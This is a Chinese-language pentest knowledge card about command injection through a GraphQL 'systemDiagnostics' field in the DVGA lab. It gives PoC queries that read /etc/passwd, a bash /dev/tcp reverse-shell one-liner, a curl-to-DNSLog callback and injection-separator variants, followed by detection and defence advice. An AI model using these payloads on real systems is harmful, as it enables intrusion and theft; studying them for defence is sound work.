---
id: web-generic-graphql-systemdiagnostics-cmd-injection
title: GraphQL systemDiagnostics 诊断查询把 cmd 参数直接交给 shell：uname -a 等命令输出原样回显
type: scenario
domain: web
path: web/generic/graphql
technique: graphql-systemdiagnostics-command-injection
aliases:
- GraphQL 命令执行
- systemDiagnostics RCE
- DVGA systemDiagnostics
- 诊断功能命令注入
- cmd 参数注入
tags:
- graphql
- command-injection
- rce
- query
- dvga
- api
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V544
  verified_at: '2026-11-11T20:38:59+08:00'
  notes: '已逐张核对33张图（img_small，无失败）与content.md命令执行2段：img33 query SystemDiagnostics(username:"admin",password:"changeme",cmd:"uname -a") 响应回显''Linux 53f92c309b65 6.1.0-16-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.67-1 (2023-12-12) x86_64 GNU/Linux''，与卡内PoC逐字一致；结合同篇命令执行1（importPaste path中;cat /etc/passwd回显）可确认GraphQL参数最终进入shell，本卡聚焦systemDiagnostics的cmd直接执行，结论成立。去重：与importpaste命令注入（不同字段/不同sink位置）、operation-name授权绕过（systemHealth数据读取而非命令执行）均非同一条利用链，related保留；dup-scan无本卡pair。DVGA无版本标记，affected_versions不设。注意原文命令执行2仅一行查询+截图，未展示源码，卡片“直接交给shell”为根据回显的合理推断。'
---

## 一句话结论

GraphQL 的 `systemDiagnostics(username, password, cmd)` 查询本意是"系统诊断"，但 resolver 把 `cmd` 参数直接交给 shell 执行并把 stdout 放进响应：提交 `systemDiagnostics(username:"admin", password:"changeme", cmd:"uname -a")` 即返回内核版本，攻击者可将 cmd 换成任意命令（读文件、反弹 shell、横向）获得 RCE。

## 原理

- **诊断功能即命令执行原语**：这类 resolver 的实现通常是"执行一条诊断命令（uptime/ps/uname/df）并返回文本"，`cmd` 直接来源于 GraphQL 参数；若用 `os.popen/subprocess(shell=True)` 执行，则任何 shell 语法与命令都可运行。
- **username/password 不是安全边界**：靶场用固定 `admin/changeme` 做流程校验（甚至可能只是示例参数），认证成功只代表"允许诊断"，并不限制命令内容；真正需要的是命令白名单（只允许 uptime/ps 等固定命令）与最小权限。
- **回显降低利用门槛**：命令 stdout 直接作为 `systemDiagnostics` 字段值返回（文章返回 `Linux 53f92c309b65 6.1.0-16-amd64 ... GNU/Linux`），无需盲注/带外，攻击者可直接读文件、枚举进程与内网。
- **与 importPaste 的区别**：importPaste 的注入需要先闭合 URL、依赖 curl 命令行拼接；systemDiagnostics 是"参数本身就是命令"，无条件执行，触发更直接。二者同属"GraphQL 参数最终进入 shell"一类缺陷。

## 触发条件

- GraphQL schema 暴露系统诊断/维护类字段（systemDiagnostics、systemDebug、execCommand、runCmd、ping、traceroute 等），参数包含命令或可拼接的命令片段。
- resolver 使用 shell 执行（os.system、subprocess shell=True、popen），且未对 cmd 做严格白名单。
- 字段可能无需认证，或仅需弱默认口令/任意登录态（本例 admin/changeme）。
- 仅用于授权测试；优先用 `id`/`uname -a` 等无副作用命令验证。

## 利用步骤

1. introspection/字段建议发现 `systemDiagnostics` 等诊断字段及其参数（username/password/cmd）。
2. 用文档中有权账号（或默认口令）提交正常命令：`cmd:"uname -a"`，确认输出回显。
3. 换 `id`/`whoami`/`cat /etc/passwd` 确认权限与文件可读性；观察是否以容器 root 或低权用户运行。
4. 评估出网能力：`cmd:"curl http://<dnslog>/x"` 或 `cmd:"ping -c 1 <dnslog域>"`，DNSLog 收到即具备带外通道。
5. 需要进一步利用时构造反弹 shell（`bash -i >& /dev/tcp/IP/PORT 0>&1`）或下载执行载荷；注意容器/whoami 权限边界。
6. 清理测试文件与进程，记录命令与回显作为证据。

## PoC

```graphql
query SystemDiagnostics {
  systemDiagnostics(
    username: "admin",
    password: "changeme",
    cmd: "uname -a"
  )
}
```

```json
// 响应（节选）
{"data": {"systemDiagnostics": "Linux 53f92c309b65 6.1.0-16-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.67-1 (2023-12-12) x86_64 GNU/Linux\n"}}
```

```graphql
# 读文件 / 确认权限（示意，仅授权环境）
query SystemDiagnostics {
  systemDiagnostics(username: "admin", password: "changeme",
                    cmd: "id; cat /etc/passwd")
}
```

## 变体与关联

- 变体：参数可能是"命令名+固定参数"（`ping(host)` 拼 `ping -c 1 <host>`），此时在 host 中注入 `; id`、`| id`、`&& id`、`$(id)`、反引号或换行（`%0a`）。
- 变体：无回显时用时间盲注（`sleep 5`）、DNSLog/HTTP 回连、把结果写到 Web 可访问目录。
- 变体：Windows 目标尝试 `whoami`、`dir`、`ping -n 1`、PowerShell 下载执行；分隔符 `&`、`|`、`&&`。
- 关联：[[web-generic-graphql-importpaste-command-injection]]（同靶场 importPaste 的 curl 拼接命令注入）、[[web-generic-graphql-operation-name-authz-field-bypass]]（同一 systemDiagnostics/systemHealth 字段还存在 operation 名授权绕过，可组合：先绕过鉴权再执行命令）、[[web-generic-graphql-endpoint-discovery-schema-enumeration]]（发现诊断字段）。

## 检测与防御

- 检测：审计 resolver 中任何接受字符串并交给 shell 的诊断/维护字段；监控 GraphQL 请求中出现 `;`、`|`、`&&`、`$(`、反引号、换行的参数；对异常子进程（uname/id/cat/curl/bash -i）做主机告警。
- 防御：删除生产环境的诊断/调试字段；必须保留时用固定命令白名单（枚举 + 不允许用户传命令），以 argv 数组 `subprocess.run([...], shell=False)` 执行；字段级鉴权 + 强口令；容器低权限运行、只读根文件系统、限制出网；统一错误/日志审计。
- 说明：本文是 GraphQL 诊断字段的命令注入 RCE 场景，severity 记为 high；仅用于授权测试。
